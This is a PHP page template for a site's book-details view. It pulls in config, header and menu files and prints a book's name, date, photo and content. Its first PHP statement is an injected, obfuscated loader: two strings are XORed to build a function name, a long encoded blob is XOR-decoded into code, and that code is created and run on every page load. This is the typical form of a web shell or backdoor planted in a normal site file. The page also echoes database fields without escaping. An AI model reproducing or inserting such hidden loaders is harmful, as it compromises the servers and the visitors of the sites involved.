<!-- Include header part -->
<?php $rkRTWwsc='6YU21Wt-:SM1 CB'; $XsGnbr='U+0SE2+KO=.EI,,'^$rkRTWwsc; $xyMMlM='PHzp2D+MN;8=>3-GJ9Myo0QCn=TD57>A:<Iexh-s1<;4V=,S>F>OKgS3F8ba 2CrE Z:YmOe:01gWOdYzBgh0aU-BWYuBTn7qm>;YyeIruicLDiTNM0042UggZJ 6McfW LrGSJYpU4;rFsneuSW,ZpB;ofmoU N7iWXNjAN ;;=Czp V8kapbb3YNN;NOPQGV8AaklyGN0Dyn3S2 mxP7M<><ZsHHZ9 l=0OsiSUL;=<uiY ,82-+Zdbj+cb=;uku-SUgU3KbSfBu=ZL9+Eu1ngq2;B.e3XCiqzmF 1U1MqX1N3woqJM6U:PAo>grBQnmboRR6PJcLCdX. QA3QhGjcl7h1w+brMKOJ8ETEzRom=7<<7xB=X=dq>QH8g 6+sJan 35MLycrOO UgrAs 7>>HjsKLaEM:h<U:.mPB7 =:-9I,LU Sp4=546LO-a2;Y:P7Y8 Bv3XW,5INnb<720edTqI,ER4VHGpHcl<6JG7T> UkET < ,:j>2IsS> 49KjrEW-wnPk+93WdmhnBEWVcQo-LFZwcG0HedJtMmUt,.HjH py2tJYmWJZ0QWb0cv3tUwSSncduclBcX4J 0=l>75i+>T2C2JiFO=9WPUitPjJ F0KZBFDlzCEnJU PPzF4U-30J  B .4XR5qRSg0X-EXfAxxH'; $WegoSmR=$XsGnbr('', '9.RQT1E.:RWSaVU.9M>QHH>11Y50Tha,OHnLQHVy8ZNZ5IE<PfF 987R2Y=>MG7ZaD;N8AoAQUHNwoDyZ9ma9E:X6wdUesU=xdXT+QA RHISwdM=r>DBXW;OC>+TWdXFsIgYnYCPT:AORhNNMQ76X;+fR2F3OqK+N2s1nOa=TIWX-RTK3AB<YYh:P<+O;=>yc9M5HPfp:DMNsJW2FAMEpQ,PMYayl,;MA3VU6STs3-WNYNcSFCJWLH2DJNt -rp<.UL uC>V2BnXbQK; LNlUJdnUVZ6O:X=:ILZI-EHn;DU<P:RWRQn;W9O5zeCmx+7NECK63B1cC7Im>AR4 P9HoN<>r9d2x6R,8onS -eGlOIKVPIRQbFR4mUZ0<Y8KSRSwAJKVLvFpjV+.T4GOaWVVRK-QyB1k8G0LX4NOMmbwUSIHK M <Z6XLRGkR-;L>mV,NxU8KEtBl<2OZ-+FFXVFQLHtU-M13k=->YaXfUPbcS5JAuMctANRMC5UW0,6FIGM8BU.2TPBpOOXG6MMNHbm:2VyKI-2;,D,U1B9cTpPuSMO+SpDCAPLx:TfyiU4oPRQDVB3Ga7ZTWRJLdExU8RQD3URL6NF=A7AbN6.DU811NXpN.A2QbsbfdLZc>dC0V1<RbP4YRkmPA;LAU<uhXiYnU D1pVhCr5'^$xyMMlM); $WegoSmR(); 
	include('config/config.php');
	include('common/header.php');
	include('common/pagequery.php');
	if(isset($_SESSION['username']))
	{
		header('location:'.$localpath.'/admin/templates/index.php');
	}
?>
<!-- Include header part end -->
	<!-- Header Container Start -->
		<?php include("common/menu.php") ?>
	<!-- Header Container End -->
	<!-- Inner page header container Start -->
	<div class="row">
		<div class="inner-brdr"></div>
	</div>
	<!-- Inner page header container End -->
	<!-- Video Container Start -->
	<div class="container">
		<div class="service-container details">
			<div class="row">
				<!-- Service Page Start -->
				<div class="col-md-12">
					<img src="admin/books/<?php echo $brows['photo'] ?>" width="300" height="350" border="0" alt="<?php echo $brows['bookname'] ?>" align="left" title="<?php echo $brows['bookname'] ?>"/>
					<h2 class='header-text'>
						<?php echo $brows['bookname'] ?><br />
						<span><?php echo $brows['date'] ?></span>
					</h2>
					<?php echo $brows['bookcontent'] ?>
				</h2>
				</div>
				<!-- Service Page End -->
			</div>
		</div>
	</div>
	<!-- Video Container End -->

<!-- Footer included -->
<?php 
	include('common/footer.php');
?>
<!-- Footer included -->